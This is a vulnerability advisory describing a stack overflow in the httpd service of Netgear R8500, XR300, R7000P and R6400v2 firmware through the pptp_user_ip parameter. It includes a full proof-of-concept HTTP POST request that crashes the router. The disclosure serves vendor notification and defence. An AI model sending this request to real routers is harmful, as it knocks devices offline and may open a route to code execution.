

# Netgear Vulnerability

Vendor:Netgear

Product:R8500、XR300、R7000P、R6400v2

Version:1.0.2.160、1.0.3.78、1.3.3.154、1.0.4.128

Type:Stack Overflow

Author:Jiaqian Peng

Institution:pengjiaqian@iie.ac.cn



## Vulnerability description

We found an stack overflow vulnerability in Netgear router with firmware which was released recently, allows remote attackers to crash the server.

**Stack Overflow**

In `httpd` binary:

In the router's `pptp.cgi、wiz_pptp.cgi、genie_pptp.cgi、bsw_pptp.cgi` function, `pptp_user_ip` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `pptp_user_ip` to execute arbitrary code.

> XR300 in `bsw_pptp.cgi`
>
> R7000P in `pptp.cgi、wiz_pptp.cgi、genie_pptp.cgi、bsw_pptp.cgi、ru_wan_flow.cgi`
>
> R6400v2 in `bsw_pptp.cgi`

As you can see here, the input has not been checked. And then,call the function `acosNvramConfig_set ` to store this input.

<div  align="center"><img src="./images/1.png" style="zoom:80%;" /></div>

Eventually, in `pptp.cgi、wiz_pptp.cgi、genie_pptp.cgi、bsw_pptp.cgi` function. The parameter `pptp_user_ip` is directly copy to a local variable placed on the stack, which overrides the return address of the function, causing buffer overflow.

In `libacos_shared.so` binary:

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>



## PoC

We set `pptp_user_ip` as **192.168.1.100 aaaaa......** , and the router will crash, such as:

```http
POST /pptp.cgi?id=e6eb071b7186d9be11d80668fc06a52a1c9ae7337d077d8b445a924022bc7698 HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 1847
Origin: http://192.168.1.1
Authorization: Basic YWRtaW46YWRtaW4=
Connection: close
Referer: http://192.168.1.1/BAS_pptp.htm
Cookie: XSRF_TOKEN=3043345236
Upgrade-Insecure-Requests: 1

apply=%E5%BA%94%E7%94%A8&login_type=PPTP&pptp_username=pjqwudi&pptp_passwd=abc123&pptp_dod=1&pptp_idletime=5&myip_1=192&myip_2=168&myip_3=1&myip_4=100&mymask_1=255&mymask_2=255&mymask_3=255&mymask_4=255&pptp_serv_ip=10.0.0.138&mygw_1=192&mygw_2=168&mygw_3=31&mygw_4=1&pptp_conn_id=pjqwudi&DNSAssign=0&MACAssign=0&runtest=no&wan_ipaddr=192.168.31.102&pptp_localip=0.0.0.0&pptp_user_ip=192.168.1.100 &serv_ip=10.0.0.138&wan_dns_sel=0&wan_dns1_pri=...&wan_dns1_sec=...&wan_hwaddr_sel=0&wan_hwaddr_def=2C%3A30%3A33%3A66%3AB7%3AAD&wan_hwaddr2=2C303366B7AD&wan_hwaddr_pc=FC%3A34%3A97%3A49%3A4B%3A24&pptp_gateway=192.168.31.1&gui_region=&pptp_user_netmask=255.255.255.255&static_pptp_enable=1&pptp_ip_sel=0&gui_language=SimplifiedChinese&auto_time=0&ipv6_proto=disable&ipv6_proto_auto=&auto_conn_time_default=0&parental_control=0&dial_on_demand_warning=1
```

<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>





## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/4.png" style="zoom:80%;" /></div>
